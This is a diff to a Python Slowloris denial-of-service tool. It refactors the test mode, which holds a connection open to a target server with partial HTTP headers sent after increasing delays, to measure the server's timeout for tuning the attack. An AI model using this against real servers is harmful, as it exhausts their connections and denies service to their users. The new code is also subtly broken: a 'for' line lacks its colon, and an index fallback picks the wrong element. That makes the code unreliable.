@@ -180,16 +180,11 @@ def domultithreading(num):
 
 if args.test:
 	times = [2, 30, 90, 240, 500]
-	totaltime = 0
 	
-	for i in times:
-		totaltime += i
-	
-	totaltime /= 60
+	total_time = round(sum(times) / 60, 2)
 
-	print("This test could take up to {} minutes.".format(totaltime))
+	print("This test could take up to {} minutes.".format(total_time))
 
-	delay = 0
 	working = 0
 
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -227,28 +222,25 @@ if args.test:
 		print("Is something wrong?\nDying.")
 		sys.exit()
 
-	for i in range(len(times)):
-		print("Trying a {} second delay: ".format(times[i]))
-		
-		time.sleep(times[i])
+	try:
+		for i, delay in enumerate(times)
+			print("Trying a {} second delay: ".format(delay))
 
-		try:
+			time.sleep(delay)
+
 			if sock.send(b"X-a: b\r\n"):
 				print("\tWorked.")
-				delay = i;
 			else:
-				print("\tFailed after {} seconds.".format(times[i]))
-		except socket.error:
-			delay = times[i-1]
-			break
+				print("\tFailed after {} seconds.".format(delay))
+				delay = times[i-1]
+				break
 
-	try:
 		if sock.send(b"Connection: Close\r\n\r\n"):
 			print("Okay that's enough time. Slowloris closed the socket.")
-			print("Use {} seconds for -timeout.".format(delay))
 		else:
 			print("Remote server closed socket.")
-			print("Use {} seconds for -timeout.".format(delay))
+			
+		print("Use {} seconds for -timeout.".format(delay))
 	except socket.error:
 		pass
 
